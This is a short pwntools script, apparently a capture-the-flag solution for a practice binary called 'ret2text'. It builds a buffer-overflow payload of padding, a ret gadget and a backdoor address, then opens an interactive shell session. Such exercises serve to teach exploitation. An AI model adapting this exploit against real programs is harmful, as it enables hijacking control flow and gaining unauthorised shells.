from pwn import *
p = process("./ret2text")
backdoor = 0x000000000040121B
ret = 0x000000000040101a
payload = b'A' * 0x48 + p64(ret) + p64(backdoor)
p.sendline(payload)
p.interactive()
